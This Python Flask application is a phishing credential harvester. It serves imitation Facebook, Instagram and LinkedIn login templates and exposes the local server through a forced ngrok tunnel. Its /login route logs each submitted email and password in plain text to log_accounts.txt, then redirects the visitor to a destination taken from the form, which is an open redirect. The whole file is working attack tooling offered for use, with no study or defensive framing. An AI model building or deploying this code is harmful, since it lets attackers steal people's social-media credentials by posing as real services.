import os
import sys
from datetime import datetime
from flask import Flask
from flask import redirect
from flask import request
from flask import render_template


def init_webhooks(base_url):
    # Update inbound traffic via APIs to use the public-facing ngrok URL
    pass


def create_app():
    app = Flask(__name__)

    # Initialize our ngrok settings into Flask
    app.config.from_mapping(
        BASE_URL="http://localhost:5000",
        USE_NGROK=os.environ.get("USE_NGROK", "False") == "True" and os.environ.get("WERKZEUG_RUN_MAIN") != "true"
    )

    if True:
        # pyngrok will only be installed, and should only ever be initialized, in a dev environment
        from pyngrok import ngrok

        # Get the dev server port (defaults to 5000 for Flask, can be overridden with `--port`
        # when starting the server
        port = sys.argv[sys.argv.index("--port") + 1] if "--port" in sys.argv else 5000

        # Open a ngrok tunnel to the dev server
        public_url = ngrok.connect(port).public_url
        print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:{}\"".format(public_url, port))

        # Update any base URLs or webhooks to use the public ngrok URL
        app.config["BASE_URL"] = public_url
        init_webhooks(public_url)

    # ... Initialize Blueprints and the rest of our app

    return app

app = create_app()


@app.route('/')
def index():
    return ''


@app.route('/facebook')
def facebook():
    return render_template('facebook.html')


@app.route('/instagram')
def instagram():
    return render_template('instagram.html')


@app.route('/linkedin')
def linkedin():
    return render_template('linkedin.html')


@app.route('/my_template2')
def my_template2():
    return render_template('my_template2.html')


@app.route('/login', methods=['POST'])
def login():
    socialnet = '\n\n[+]' + str(request.form.get('socialnet'))
    time = ('\n Time: ' + str(datetime.now()))
    email = '\n Email: ' + str(request.form.get('email'))
    password = '\n Password: ' + str(request.form.get('auxpass'))
    redirectvalue = str(request.form.get('redirectvalue'))

    with open('log_accounts.txt', 'at') as f:
        f.write(socialnet +
                time +
                email +
                password
                )

    return redirect(redirectvalue)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
